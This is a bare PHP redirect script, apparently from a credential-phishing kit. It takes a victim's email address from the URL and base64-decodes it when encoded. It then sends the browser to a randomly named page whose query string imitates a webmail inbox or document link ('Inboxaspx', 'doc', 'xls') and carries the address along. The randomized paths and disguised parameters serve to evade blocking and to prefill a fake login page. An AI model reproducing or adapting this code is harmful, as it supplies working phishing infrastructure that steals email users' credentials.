<?php 
$B = "";
if(isset($_GET['email'])) {
    $B = $_GET['email'];
    // Decode base64 email if it's encoded
    if (base64_decode($B, true) !== false) {
        $decoded = base64_decode($B);
        // Check if decoding produced valid result
        if ($decoded !== false && $decoded !== '') {
            $B = $decoded;
        }
    }
}

$E = substr(md5(rand()), 0, 28);
$C = substr(md5(rand()), 0, 28);
$A = substr(md5(rand()), 0, 28);
$D = $E . ".php?sam=77Inboxaspxn" . $C . "&Id" . $C . "&doc" . $A . "&email=" . urlencode($B) . "&jiv" . $A . "&xls1d&id=fav&doc";
header("Location: $D");
exit;
?>